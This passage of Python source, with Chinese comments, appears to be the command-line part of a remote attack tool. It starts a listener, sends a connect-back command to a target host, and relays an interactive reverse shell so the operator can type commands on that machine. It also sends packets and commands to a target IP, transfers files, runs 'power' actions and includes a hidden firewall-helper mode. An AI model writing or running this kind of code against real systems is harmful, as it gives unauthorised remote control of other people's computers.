    server = ShellServer(port=arguments.shell_port, local_ip=arguments.shell_ip or None)
    server.start()
    try:
        print(
            "本机监听 %s:%d，脚本服务端口 %d"
            % (server.address, server.port, server.http_port),
            flush=True,
        )
        command = server.command()
        print("向 %s 下发连接命令（%d 个字符）" % (host, len(command)), flush=True)
        send_command(host, command, port=arguments.p, report=print)
        log.info(
            "反弹终端",
            "反弹终端",
            "目标：%s；监听端口：%d" % (host, server.port),
        )
        relay_shell(server, host)
    finally:
        server.close()
        print("已停止监听与脚本服务", flush=True)
    return True


def relay_shell(server, host):
    """把本机终端与目标会话接起来：本机输入发过去，目标输出回显。"""
    if sys.stdin is None:
        print("当前没有可用的标准输入，只显示目标输出；按 Ctrl+C 结束", flush=True)
        _stream_shell(server)
        return
    lines = Queue()
    Thread(target=_read_stdin, args=(lines,), daemon=True).start()
    print("等待 %s 连回，输入 exit 结束会话" % host, flush=True)
    announced = False
    while True:
        output = server.poll()
        if output:
            if not announced:
                announced = True
                print("目标已连回，可以直接输入命令：", flush=True)
            sys.stdout.write(output)
            sys.stdout.flush()
        if announced and not server.connected:
            print("目标已断开", flush=True)
            return
        try:
            line = lines.get(timeout=0.2)
        except Empty:
            continue
        if line is None:
            # 输入结束（管道读完或用户按了 Ctrl+Z），把剩下的输出收完再退出。
            sleep(0.5)
            output = server.poll()
            if output:
                sys.stdout.write(output)
                sys.stdout.flush()
            return
        text = line.rstrip()
        if text.strip().lower() in {"exit", "quit"}:
            print("结束会话", flush=True)
            return
        if not server.connected:
            print("目标还没连回来，命令未发送：%s" % text, flush=True)
            continue
        server.send(text)


def _read_stdin(lines):
    """把标准输入逐行放进队列，读到结尾时放一个 None 作为结束标记。"""
    stream = sys.stdin
    if stream is None:
        lines.put(None)
        return
    try:
        for line in stream:
            lines.put(line)
    except (OSError, ValueError):
        pass
    lines.put(None)


def _stream_shell(server):
    """没有标准输入时只回显目标输出，直到连接断开或用户中断。"""
    announced = False
    try:
        while True:
            output = server.poll()
            if output:
                if not announced:
                    announced = True
                    print("目标已连回，正在显示输出：", flush=True)
                sys.stdout.write(output)
                sys.stdout.flush()
            elif announced and not server.connected:
                print("目标已断开", flush=True)
                return
            sleep(0.2)
    except KeyboardInterrupt:
        print("已结束会话", flush=True)


def run_from_cmd(arguments):
    """校验参数并分发 CLI 请求。"""
    log_arguments(arguments)
    log = cli_log.LOG
    try:
        if run_action(arguments):
            return
        single_command(arguments)
        if arguments.e == "nc":
            return run_shell(arguments)
        if arguments.e in {"g", "break", "continue"}:
            return
        if arguments.file:
            if arguments.e or arguments.msg or arguments.msg_file or arguments.c:
                raise ValueError("文件传送不能与消息、命令或 -e 扩展功能同时使用")
            return run_file_transfer(arguments)
        if arguments.file_ip or arguments.file_timeout != 120:
            raise ValueError("--file-ip 和 --file-timeout 仅用于文件传送")
        send_list = create_send_packets(arguments)
        if send_list:
            log.info(
                "开始发送",
                "发送",
                "目标：%s；端口：%d；报文：%d 个；循环：%d 次；间隔：%d 秒"
                % (
                    arguments.ip,
                    arguments.p,
                    len(send_list),
                    arguments.l,
                    arguments.t,
                ),
            )
            outcome = send_tracked(
                send_list,
                arguments.ip,
                arguments.p,
                arguments.l,
                arguments.t,
                report=print,
            )
            print_delivery(outcome)
        elif arguments.e not in {"r", "s"}:
            raise ValueError("请至少指定消息、命令或 -e 扩展功能")
        if arguments.e in {"r", "s"}:
            run_power(arguments)
    except Exception as e:
        print("[-] %s" % e)
        log.error("命令执行失败", "命令行", "异常：%s" % e)
        return 1
    return 0


def main(argv=None):
    """解析参数并执行 CLI 或隐藏的防火墙助手。"""
    arguments = list(sys.argv[1:] if argv is None else argv)
    if arguments[:1] == [FIREWALL_HELPER_ARGUMENT]:
        return run_firewall_helper(arguments[1:])
    if is_informational(arguments):
        # 帮助与版本号走 argparse 自身的退出路径，不创建数据目录与日志文件。
        parser.parse_args(arguments)
        return 0
    start_logging()
    cli_log.LOG.info(
        "命令行启动",
        "命令行",
        "参数：%s" % (" ".join(arguments) if arguments else "无"),
    )
    try:
        code = run_from_cmd(parser.parse_args(arguments))
    except SystemExit as error:
        # --help 与 --version 也用 SystemExit 结束，退出码 0 属于正常结束。
        if error.code in (0, None):
            cli_log.LOG.info("参数解析结束", "命令行", "退出码：%s" % error.code)
        else:
            cli_log.LOG.warning("参数解析未通过", "命令行", "退出码：%s" % error.code)
        cli_log.close()
        raise
    except BaseException:
        cli_log.close()
        raise
    cli_log.LOG.info("命令行结束", "命令行", "退出码：%s" % code)
    cli_log.close()
    return code
